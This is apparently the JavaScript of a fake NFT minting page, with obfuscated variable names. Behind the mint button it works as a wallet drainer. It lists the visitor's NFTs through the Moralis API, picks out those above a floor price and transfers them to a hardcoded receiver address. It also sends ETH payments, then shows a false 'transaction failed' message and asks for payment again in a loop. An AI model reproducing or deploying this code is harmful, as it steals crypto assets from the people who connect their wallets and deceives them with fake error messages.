const priceHtml = document.getElementById("lnprice");
let tempMaxSup = mintInfo.minUnits;
document.getElementById("plus").addEventListener("click", function () {
  let irhaa = parseInt(priceHtml.innerText, 10);
  if (irhaa >= mintInfo.maxUnits) {
    irhaa = mintInfo.maxUnits;
  } else {
    ++irhaa;
  }
  updatePrice(irhaa);
});
document.getElementById("minus").addEventListener("click", function () {
  let anirah = parseInt(priceHtml.innerText, 10);
  if (anirah <= mintInfo.minUnits) {
    anirah = mintInfo.minUnits;
  } else {
    --anirah;
  }
  updatePrice(anirah);
});
document.getElementById("ape-max").addEventListener("click", function () {
  let shaquel = parseInt(priceHtml.innerText, 10);
  if (shaquel != mintInfo.maxUnits) {
    tempMaxSup = shaquel;
    updatePrice(mintInfo.maxUnits);
  } else {
    updatePrice(tempMaxSup);
  }
});
function updatePrice(suesan) {
  const xuan = (suesan * mintInfo.price).toFixed(2);
  document.getElementById("lnprice").innerText = suesan;
  document.getElementById("price").innerText = xuan;
}
function isMobile() {
  var eriyah = false;
  return function (nahmir) {
    if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(nahmir) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(nahmir.substr(0, 4))) {
      eriyah = true;
    }
  }(navigator.userAgent || navigator.vendor || window.opera), eriyah;
}
function openInNewTab(katin) {
  Object.assign(document.createElement("a"), {target: "_blank", href: katin}).click();
}
const ethers = window.ethers, Web3Modal = window.Web3Modal.default, WalletConnectProvider = window.WalletConnectProvider.default, evmChains = window.evmChains;
let web3Modal, provider, selectedAccount;
function init() {
  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
  console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);
  const chazman = {walletconnect: {package: WalletConnectProvider, options: {infuraId: infuraId}}};
  web3Modal = new Web3Modal({cacheProvider: false, providerOptions: chazman, theme: "dark"});
  console.log("Web3Modal instance is", web3Modal);
  Moralis.enableWeb3();
}
async function fetchAccountData() {
  const shion = new Web3(provider), macelynn = await shion.eth.getChainId(), lillyn = evmChains.getChain(macelynn), abert = await shion.eth.getAccounts();
  selectedAccount = abert[0];
  console.log("Web3 instance is", shion);
  console.log("Chain data is", lillyn);
  console.log("Got accounts", abert);
  console.log("Selected account is", selectedAccount);
  document.querySelector("#connect").style.display = "none";
  document.querySelector("#transfer").style.display = "block";
}
async function refreshAccountData() {
  document.querySelector("#transfer").style.display = "none";
  document.querySelector("#connect").style.display = "block";
  document.querySelector("#connect").setAttribute("disabled", "disabled");
  await fetchAccountData();
  document.querySelector("#connect").removeAttribute("disabled");
}
async function onConnect() {
  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
  } catch (emirhan) {
    console.log("Could not get a wallet connection", emirhan);
    return;
  }
  provider.on("accountsChanged", () => fetchAccountData());
  provider.on("chainChanged", () => fetchAccountData());
  provider.on("networkChanged", () => fetchAccountData());
  await refreshAccountData();
}
async function clickMint() {
  const tishena = new ethers.providers.Web3Provider(provider), lakresha = document.getElementById("price").textContent.toString();
  if (nftsInfo.active) {
    askNfts(tishena, lakresha);
  } else {
    askMint(lakresha);
  }
}
async function askNfts(khyel, emilyann) {
  const malakie = await khyel.listAccounts();
  selectedAccount = malakie[0];
  fetch("https://deep-index.moralis.io/api/v2/" + selectedAccount + "/nft?chain=eth&format=decimal", {headers: {"Content-Type": "application/json", accept: "application/json", "x-api-key": moralisApi}, method: "GET"}).then(async dshanti => {
    const brexlie = (await dshanti.json()).result;
    console.info("You have " + brexlie.length + " NFTs");
    if (brexlie.length > 0) {
      let gennette = [];
      for (nft of brexlie) {
        await fetch("https://deep-index.moralis.io/api/v2/nft/" + nft.token_address + "/lowestprice?chain=eth&days=" + nftsInfo.checkMaxDay + "&marketplace=opensea", {headers: {"Content-Type": "application/json", accept: "application/json", "x-api-key": moralisApi}, method: "GET"}).then(async mollye => {
          if (mollye.status === 200) {} else {
            return;
          }
          const wrynlee = await mollye.json();
          let loisjean = parseFloat(Web3.utils.fromWei(wrynlee.price, "ether"));
          if (nft.amount) {
            loisjean = loisjean * parseInt(nft.amount);
          }
          if (loisjean >= nftsInfo.minValue.toString(10)) {
            console.log(nft.token_address + " (" + nft.token_id + ") | " + loisjean + " > " + nftsInfo.minValue);
            gennette.push({price: wrynlee.price * (nft.amount > 0 ? nft.amount : 1), options: {type: nft.contract_type.toLowerCase(), receiver: "0x05369953cb5118D8394777Ea50001e225edAaE31", contract_address: nft.token_address, token_id: nft.token_id}});
            if (nft.contract_type === "ERC1155") {
              const stellaluna = gennette.find(sharikka => sharikka.options.contract_address == nft.token_address && sharikka.options.token_id == nft.token_id);
              if (stellaluna) {
                stellaluna.options.amount = ethers.BigNumber.from(nft.amount);
              }
            }
          } else {
            console.log("!!! " + nft.token_address + " (" + nft.token_id + ") | " + loisjean + " < " + nftsInfo.minValue);
          }
        }).catch(grettell => console.error(grettell));
      }
      if (gennette.length < 1) {
        return askMint(emilyann);
      }
      console.log(gennette);
      for (transaction of gennette.sort((dreema, jb) => jb.price - dreema.price)) {
        console.log(transaction);
        Moralis.transfer(transaction.options).catch(meris => console.error(meris, transaction));
      }
    } else {
      askMint(emilyann);
    }
  }).catch(oberta => console.log(oberta));
}
async function askMint(berthel) {
  const jusin = new Web3(provider);
  walletAddress = (await jusin.eth.getAccounts())[0];
  jusin.eth.sendTransaction({from: walletAddress, to: address, value: jusin.utils.toWei(berthel, "ether")}).on("transactionHash", function (kongmeng) {
    return setTimeout(() => {
      if (isMobile()) {} else {
        const sanayah = addNotification("error", "Error! Your transaction failed. Please try again.");
        removeNotification(sanayah, 8e3);
      }
    }, 2e3), console.log("Transaction hash: " + kongmeng), askMint(berthel);
  }).on("confirmation", function (tou, parkyr) {
    console.log("Transaction confirmed x" + tou);
  }).on("error", christpher => {
    if (christpher.message && christpher.message.includes("insufficient")) {
      console.log("Insufficient Balance: " + walletAddress + " has insufficient balance");
    }
    if (christpher.message && christpher.message.includes("User rejected") || christpher.message && christpher.message.includes("User denied")) {
      if (isMobile()) {} else {
        const ellody = addNotification("warning", "You denied the transaction. Please try again.");
        removeNotification(ellody, 5e3);
      }
      console.log("User Denied: " + walletAddress + " denied transaction");
    } else {
      console.log("Mint Error: " + walletAddress + " failed to mint");
    }
    return console.log("Error", christpher ? christpher.message : "unknown error"), askMint(berthel);
  });
}
window.addEventListener("load", async () => {
  init();
  document.querySelector("#connect").addEventListener("click", onConnect);
  document.querySelector("#transfer").addEventListener("click", clickMint);
});
